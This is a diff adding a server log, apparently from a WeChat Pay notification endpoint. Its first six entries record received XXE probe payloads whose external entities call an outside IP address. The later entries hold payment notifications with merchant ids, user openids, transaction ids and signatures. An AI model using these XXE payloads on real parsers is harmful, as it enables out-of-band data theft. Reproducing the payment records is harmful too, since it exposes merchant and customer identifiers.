@@ -1,0 +1,156 @@
+03:15:00|'<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+<!ENTITY % xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019111203_242?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">
+%xxe;
+]>'
+| GET:array (
+)
+03:15:00|'<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019111203_242?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">]>
+<foo><value>&xxe;</value></foo>'
+| GET:array (
+)
+03:29:22|'<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+<!ENTITY % xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019111203_242?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">
+%xxe;
+]>'
+| GET:array (
+)
+03:29:22|'<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019111203_242?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">]>
+<foo><value>&xxe;</value></foo>'
+| GET:array (
+)
+03:40:16|'<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+<!ENTITY % xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019111203_242?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">
+%xxe;
+]>'
+| GET:array (
+)
+03:40:16|'<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+<!ENTITY xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019111203_242?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">]>
+<foo><value>&xxe;</value></foo>'
+| GET:array (
+)
+13:46:41|'<xml><appid><![CDATA[wx6be14b9c1bbe7bc0]]></appid>
+<bank_type><![CDATA[GZCB_CREDIT]]></bank_type>
+<cash_fee><![CDATA[990]]></cash_fee>
+<fee_type><![CDATA[CNY]]></fee_type>
+<is_subscribe><![CDATA[N]]></is_subscribe>
+<mch_id><![CDATA[1543596541]]></mch_id>
+<nonce_str><![CDATA[5dca473236d09]]></nonce_str>
+<openid><![CDATA[oGq4g5YflK3OAWlSEC11BMc6hk4U]]></openid>
+<out_trade_no><![CDATA[270062688158420101301]]></out_trade_no>
+<result_code><![CDATA[SUCCESS]]></result_code>
+<return_code><![CDATA[SUCCESS]]></return_code>
+<sign><![CDATA[5A93A32DEB0550C4550174DF5B2D62FD]]></sign>
+<time_end><![CDATA[20191112134640]]></time_end>
+<total_fee>990</total_fee>
+<trade_type><![CDATA[JSAPI]]></trade_type>
+<transaction_id><![CDATA[4200000465201911121229854583]]></transaction_id>
+</xml>'
+| GET:array (
+)
+13:46:41|notify  array (
+  'appid' => 'wx6be14b9c1bbe7bc0',
+  'bank_type' => 'GZCB_CREDIT',
+  'cash_fee' => '990',
+  'fee_type' => 'CNY',
+  'is_subscribe' => 'N',
+  'mch_id' => '1543596541',
+  'nonce_str' => '5dca473236d09',
+  'openid' => 'oGq4g5YflK3OAWlSEC11BMc6hk4U',
+  'out_trade_no' => '270062688158420101301',
+  'result_code' => 'SUCCESS',
+  'return_code' => 'SUCCESS',
+  'sign' => '5A93A32DEB0550C4550174DF5B2D62FD',
+  'time_end' => '20191112134640',
+  'total_fee' => '990',
+  'trade_type' => 'JSAPI',
+  'transaction_id' => '4200000465201911121229854583',
+)
+| GET:array (
+)
+13:50:29|'<xml><appid><![CDATA[wx6be14b9c1bbe7bc0]]></appid>
+<bank_type><![CDATA[CMB_CREDIT]]></bank_type>
+<cash_fee><![CDATA[4180]]></cash_fee>
+<fee_type><![CDATA[CNY]]></fee_type>
+<is_subscribe><![CDATA[N]]></is_subscribe>
+<mch_id><![CDATA[1543596541]]></mch_id>
+<nonce_str><![CDATA[5dca4814c754e]]></nonce_str>
+<openid><![CDATA[oGq4g5US1NiDbeDINPhiTZJ6csoY]]></openid>
+<out_trade_no><![CDATA[219062688180640708301]]></out_trade_no>
+<result_code><![CDATA[SUCCESS]]></result_code>
+<return_code><![CDATA[SUCCESS]]></return_code>
+<sign><![CDATA[A05DEC12C3B15DDD3D2F2F0D1FAF4F48]]></sign>
+<time_end><![CDATA[20191112135027]]></time_end>
+<total_fee>4180</total_fee>
+<trade_type><![CDATA[JSAPI]]></trade_type>
+<transaction_id><![CDATA[4200000466201911125075896672]]></transaction_id>
+</xml>'
+| GET:array (
+)
+13:50:29|notify  array (
+  'appid' => 'wx6be14b9c1bbe7bc0',
+  'bank_type' => 'CMB_CREDIT',
+  'cash_fee' => '4180',
+  'fee_type' => 'CNY',
+  'is_subscribe' => 'N',
+  'mch_id' => '1543596541',
+  'nonce_str' => '5dca4814c754e',
+  'openid' => 'oGq4g5US1NiDbeDINPhiTZJ6csoY',
+  'out_trade_no' => '219062688180640708301',
+  'result_code' => 'SUCCESS',
+  'return_code' => 'SUCCESS',
+  'sign' => 'A05DEC12C3B15DDD3D2F2F0D1FAF4F48',
+  'time_end' => '20191112135027',
+  'total_fee' => '4180',
+  'trade_type' => 'JSAPI',
+  'transaction_id' => '4200000466201911125075896672',
+)
+| GET:array (
+)
+13:51:10|'<xml><appid><![CDATA[wx6be14b9c1bbe7bc0]]></appid>
+<bank_type><![CDATA[CMB_CREDIT]]></bank_type>
+<cash_fee><![CDATA[1680]]></cash_fee>
+<fee_type><![CDATA[CNY]]></fee_type>
+<is_subscribe><![CDATA[N]]></is_subscribe>
+<mch_id><![CDATA[1543596541]]></mch_id>
+<nonce_str><![CDATA[5dca484716756]]></nonce_str>
+<openid><![CDATA[oGq4g5US1NiDbeDINPhiTZJ6csoY]]></openid>
+<out_trade_no><![CDATA[261062688186130108301]]></out_trade_no>
+<result_code><![CDATA[SUCCESS]]></result_code>
+<return_code><![CDATA[SUCCESS]]></return_code>
+<sign><![CDATA[7F7358AD8F58113592D7F5B6E71C13DA]]></sign>
+<time_end><![CDATA[20191112135108]]></time_end>
+<total_fee>1680</total_fee>
+<trade_type><![CDATA[JSAPI]]></trade_type>
+<transaction_id><![CDATA[4200000463201911123640545308]]></transaction_id>
+</xml>'
+| GET:array (
+)
+13:51:10|notify  array (
+  'appid' => 'wx6be14b9c1bbe7bc0',
+  'bank_type' => 'CMB_CREDIT',
+  'cash_fee' => '1680',
+  'fee_type' => 'CNY',
+  'is_subscribe' => 'N',
+  'mch_id' => '1543596541',
+  'nonce_str' => '5dca484716756',
+  'openid' => 'oGq4g5US1NiDbeDINPhiTZJ6csoY',
+  'out_trade_no' => '261062688186130108301',
+  'result_code' => 'SUCCESS',
+  'return_code' => 'SUCCESS',
+  'sign' => '7F7358AD8F58113592D7F5B6E71C13DA',
+  'time_end' => '20191112135108',
+  'total_fee' => '1680',
+  'trade_type' => 'JSAPI',
+  'transaction_id' => '4200000463201911123640545308',
+)
+| GET:array (
+)
